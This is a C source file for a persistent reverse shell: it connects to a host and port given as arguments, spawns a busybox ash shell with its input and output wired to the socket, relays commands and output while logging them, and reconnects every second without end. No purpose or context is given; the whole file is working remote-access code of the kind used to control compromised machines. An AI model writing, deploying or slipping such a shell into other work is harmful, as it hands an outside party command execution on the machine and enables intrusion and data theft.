#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>

typedef union
{
  struct
  {
    int fd_read;
    int fd_write;
  };
  int pipes[2];
} pipes_t;

bool g_abort = false;

typedef enum {
  read_result_ok,
  read_result_eof,
  read_result_err
} read_result_t;

int create_socket(char* host, int port)
{
  int sock = -1;
  int ret = -1;
  int result = -1;
  do
  {
    sock = socket(PF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
      perror("Failed to create socket");
      break;
    }

    struct linger linger_opts =
    {
      .l_onoff = 1,
      .l_linger = 0
    };

    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_LINGER,
      &linger_opts,
      sizeof(linger_opts));

    if (ret < 0)
    {
      perror("Failed to setsockopt(SO_LINGER)");
      break;
    }

    int sockopt = 1;
    ret = setsockopt(
      sock,
      SOL_SOCKET,
      SO_REUSEADDR,
      &sockopt,
      sizeof(sockopt));

      if (ret < 0)
      {
        perror("Failed to setsockopt(SO_REUSEADDR)");
        break;
      }

      ret = fcntl(sock, F_GETFL, 0);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_GETFL)");
        break;
      }

      ret = fcntl(sock, F_SETFL, ret | O_NONBLOCK);
      if(ret < 0)
      {
        perror("Failed to fcntl(F_SETFL)");
        break;
      }

      struct hostent *server = gethostbyname(host);
      int port_no = htons(port);
      struct sockaddr_in addr =
      {
        .sin_family = AF_INET,
        .sin_port = port_no,
      };
      memcpy(&addr.sin_addr.s_addr, server->h_addr, sizeof(addr.sin_addr.s_addr));
      ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
      if(ret < 0 && errno != EINPROGRESS)
      {
        perror("Failed to connect");
        break;
      }

      fd_set outs = {0};
      FD_ZERO(&outs);
      FD_SET(sock, &outs);
      struct timeval timest =
      {
        .tv_sec = 0,
        .tv_usec = 500000,
      };

      ret = select(
          sock + 1,
          NULL,
          &outs,
          NULL,
          &timest);

      if (ret <= 0)
      {
        perror("Failed to select");
        break;
      }

      int get_ret = 0;
      unsigned int get_len = sizeof(get_ret);	/* socklen_t */

      ret = getsockopt(sock, SOL_SOCKET, SO_ERROR, &get_ret, &get_len);
      if (ret < 0)
      {
        perror("Failed to getsockopt");
        break;
      }

      if (get_ret > 0)
      {
        dprintf(STDERR_FILENO, "SO_ERROR set: %s\n", strerror(get_ret));
        break;
      }

      result = sock;

    } while(false);

    if (result < 0)
    {
      if(sock > 0)
      {
        shutdown(sock, SHUT_RDWR);
        close(sock);
        sock = -1;
      }
    }

    return result;
}

int run_child(int sock, pipes_t to_child, pipes_t from_child)
{
  int ret = -1;
  int saved_stderr = -1;

  ret = close(sock);
  if (ret < 0)
  {
    perror("Failed to close(sock)");
    return -1;
  }

  saved_stderr = dup(STDERR_FILENO);
  if(saved_stderr < 0)
  {
    perror("Failed to dup(STDERR_FILENO)");
    return -1;
  }

  ret = dup2(to_child.fd_read, STDIN_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDIN_FILENO)");
    return -1;
  }

  ret = close(to_child.fd_read);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to close(to_child.fd_read)");
    return -1;
  }

  ret = dup2(from_child.fd_write, STDOUT_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDOUT_FILENO)");
    return -1;
  }

  ret = close(from_child.fd_write);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to close(to_child.fd_read)");
    return -1;
  }

  ret = dup2(STDOUT_FILENO, STDERR_FILENO);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to dup2(STDERR_FILENO)");
    return -1;
  }

  ret = execlp("/bin/busybox", "ash", "-l", "-m", NULL);
  if (ret < 0)
  {
    dup2(saved_stderr, STDERR_FILENO);
    perror("Failed to execl");
    return -1;
  }

  return 0;
}

read_result_t do_read(char* prefix, fd_set* fds, int fd_from, int fd_to)
{
  if(FD_ISSET(fd_from, fds) == false)
  {
    return read_result_ok;
  }

  unsigned char buf[1024] = {0};
  size_t bytes_read = read(fd_from, buf, sizeof(buf));
  if(bytes_read == 0)
  {
    return read_result_eof;
  }

  size_t bytes_written = write(fd_to, buf, bytes_read);
  if (bytes_written != bytes_read)
  {
    perror("Failed to write");
    return read_result_err;
  }

  for(
    char* tok = strtok(buf, "\n");
    tok != NULL;
    tok = strtok(NULL, "\n")
  )
  {
    dprintf(2, "%s%s\n", prefix, tok);
  }

  return read_result_ok;
}

void signal_handler(int signal)
{
  pid_t pid = getpid();
  dprintf(2, "Process: %d, Received Signal: %s\n", pid, strsignal(signal));
  g_abort = true;
}

int run_parent(pid_t child_pid, int sock, pipes_t to_child, pipes_t from_child)
{
  int ret = -1;
  int result = -1;
  read_result_t read_ret = read_result_err;

  g_abort = false; 
  signal(SIGCHLD, signal_handler);

  ret = close(from_child.fd_write);
  if (ret < 0)
  {
    perror("Failed to close(from_child.fd_write)");
    return result;
  }

  ret = close(to_child.fd_read);
  if (ret < 0)
  {
    perror("Failed to close(to_child.fd_read)");
    return result;
  }

  while (g_abort == false)
  {
    fd_set read_fds = {0};
    FD_ZERO(&read_fds);
    FD_SET(from_child.fd_read, &read_fds);
    FD_SET(sock, &read_fds);
    int nfds = (sock > from_child.fd_read) ? (sock + 1): (from_child.fd_read + 1);
    ret = select(nfds, &read_fds, NULL, NULL, NULL);
    if (ret < 0)
    {
      perror("Failed to select");
      break;
    }

    if (ret == 0)
    {
      continue;
    }

    read_ret = do_read("TX >> ", &read_fds, from_child.fd_read, sock);
    if (read_ret == read_result_err)
    {
      perror("Failed to do_read(from_child.fd_read)");
      break;
    }
    else if (read_ret == read_result_eof)
    {
      result = 0;
      break;
    }

    read_ret = do_read("RX << ", &read_fds, sock, to_child.fd_write);
    if (read_ret == read_result_err)
    {
      perror("Failed to do_read(from_child.fd_read)");
      break;
    }
    else if (read_ret == read_result_eof)
    {
      result = 0;
      break;
    }
  }

  return result;
}

int rush(char* server, int port)
{
  int sock = -1;
  int ret = -1;
  pid_t pid = -1;
  pipes_t to_child = { -1, -1 };
  pipes_t from_child = { -1, -1 };

  do
  {
    sock = create_socket(server, port);
    if (sock < 0)
    {
      perror("Failed to create_socket");
      break;
    }

    ret = pipe2(to_child.pipes, O_NONBLOCK | O_CLOEXEC);
    if(ret < 0)
    {
      perror("Failed to pipe2(to_child)");
      break;
    }

    ret = pipe2(from_child.pipes, O_NONBLOCK |  O_CLOEXEC);
    if(ret < 0)
    {
      perror("Failed to pipe2(from_child)");
      break;
    }

    signal(SIGCHLD, SIG_DFL);

    pid = vfork();
    if (pid < 0) // error
    {
      perror("Failed to fork");
      break;
    }
    else if (pid == 0) // child
    {
      dprintf(2, "RUN CHILD\n");
      ret = run_child(sock, to_child, from_child);
      if (ret < 0)
      {
        perror("Failed to run_child");
        break;
      }
      exit(ret);
    }

    dprintf(2, "PARENT: %d\n", getpid());
    dprintf(2, "CHILD: %d\n", pid);
    dprintf(2, "RUN PARENT\n");
    ret = run_parent(pid, sock, to_child, from_child);
    if (ret < 0)
    {
      perror("Failed to run_parent");
      break;
    }

  } while(false);

  if (pid > 0)
  {
    ret = kill(pid, SIGKILL);
    if (ret < 0)
    {
      perror("Failed to kill");
    }

    dprintf(2, "Killed PID: %d\n", pid);

    pid_t waited = waitpid(pid, NULL, 0);
    if (waited != pid)
    {
      perror("Failed to wait");
    }

    dprintf(2, "Waited  PID: %d\n", pid);
  }

  if (to_child.fd_write > 0)
  {
    close(to_child.fd_write);
    to_child.fd_write = -1;
  }

  if (from_child.fd_read > 0)
  {
    close(from_child.fd_read);
    from_child.fd_read = -1;
  }

  if(sock > 0)
  {
    ret = shutdown(sock, SHUT_RDWR);
    if (ret < 0)
    {
      perror("Failed to shuwdown");
    }

    ret = close(sock);
    if (ret < 0)
    {
      perror("Failed to close(sock)");
    }

    sock = -1;
  }

  dprintf(STDERR_FILENO, "DONE\n");
}

int main(int argc, char** argv)
{
  int ret = -1;

  if (argc < 3)
  {
    dprintf(2, "Usage: %s <server> <port>\n", basename(argv[0]));
    return 1;
  }

  int port = atoi(argv[2]);
  char* server = argv[1];

  do {
      int ret = rush(server, port);
      if (ret < 0)
      {
        perror("Failed to rush");
        return 1;
      }

      sleep(1);
  } while(true);

  return 0;

}
